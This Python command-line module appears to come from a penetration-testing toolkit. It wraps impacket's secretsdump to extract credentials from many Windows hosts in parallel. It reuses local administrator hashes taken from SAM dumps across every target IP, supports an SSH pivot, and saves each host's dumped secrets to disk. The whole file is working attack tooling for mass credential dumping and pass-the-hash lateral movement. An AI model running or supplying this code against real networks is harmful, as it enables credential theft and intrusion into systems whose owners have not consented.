from pathlib import Path
import itertools
import pprint

import click

from .. import logging
from ..toolz import *
from .. import ntlm, secretsdump, logging, shell, parallel
from . import common

log = new_log(__name__)

@click.command()
@common.impacket_input_options
@click.option(
    '-o', '--output-dir', type=click.Path(
        resolve_path=True,
    ), default='.',
    help=('Output file path (default: ".")'),
)
@common.impacket_cred_options
@common.ssh_options
@click.option(
    '--max-workers', type=int, default=5,
    help=(
        'Number of parallel worker threads (default=5)'
    ),
)
@click.option(
    '--echo', is_flag=True,
    help=(
        'Echo the content of the individual commands for debugging purposes'
    ),
)
@click.option(
    '--loglevel', default='info',
    help=('Log output level (default: info)'),
)
def dump(ippath, target, sam_path, output_dir, username, password, 
         domain, hashes, ssh, max_workers, echo, loglevel):
    logging.setup_logging(loglevel)
    
    echo = echo or loglevel == 'debug'

    creds = []

    ips = []
    if ippath:
        log.info(f'Reading IPs from path: {ippath}')
        ips = get_ips_from_file(ippath)
    elif target:
        log.info(f'Using target IP: {target}')
        ips = ip_to_seq(target)

    if sam_path:
        creds = pipe(
            ntlm.parse_ip_and_sam_from_path(sam_path),
            # only want local admin (sid 500 users)
            vfilter(lambda ip, d: d['sid'] == '500'),
            vmap(lambda ip, d: (ip, dissoc(d, 'sid'))),
            vmap(lambda ip, d: merge(d, {'ip': ip})),
            tuple,
        )
        if ips:
            creds = pipe(
                itertools.product(
                    ips, creds,
                ),
                vmap(lambda ip, d: merge(
                    d, {'ip': ip}
                )),
                tuple,
            )
        missing_ips = pipe(
            creds,
            do(print),
            filter(lambda d: not d.get('ip')),
            tuple,
        )
        if missing_ips:
            log.error(
                f'{len} credentials are missing IP addresses'
                f' (e.g. {missing_ips[0]})'
            )
            creds = pipe(
                creds,
                filter(get('ip')),
                tuple,
            )

    if ips and username and password:
        creds = pipe(
            itertools.product(ips, (username,), (password,)),
            vmap(lambda ip, u, p: merge({
                'user': u,
                'password': p,
                'ip': ip,
            }, {'domain': domain} if domain else {})),
            cconcat(creds),
            tuple,
        )

    if not creds:
        raise click.UsageError(
            'No valid credential information given, provide'
            ' -i/--ippath -t/--target -s/--sam-path and, if necessary,'
            ' -u/--username -p/--password -d/--domain'
        )

    pipe(
        creds,
        map(lambda d: (
            f"{(d.get('domain') + '/') if 'domain' in d else ''}"
            f"{d['user']}:{d.get('password') or d.get('hashes')}"
            f"@{d['ip']}"
        )),
        map(lambda s: f" - {s}"),
        '\n'.join,
        lambda creds_str: log.info(
            f'Running with the following credential info:\n{creds_str}'
        ),
    )

    output_path = Path(output_dir).expanduser()
    output_path.mkdir(exist_ok=True, parents=True)
    def output_content(cred: dict, output: str):
        pw_hash = pipe(
            cred.get('password') or cred.get('hashes'),
            md5,
        )
        domain_str = f"-{cred['domain']}" if 'domain' in cred else ''
        path = (
            output_path / 
            f"secretsdump-{cred['ip']}{domain_str}-{cred['user']}-{pw_hash}.txt"
        )
        path.write_text(output)

    getoutput = shell.getoutput(echo=echo)
    if ssh:
        getoutput = common.ssh_getoutput(ssh, echo=echo)
        

    pmap = parallel.thread_map(max_workers=max_workers)
    pipe(
        creds,
        pmap(lambda c: (c, secretsdump.secretsdump(**c))),
        vmap(output_content),
        tuple,
    )

if __name__ == '__main__':
    dump()
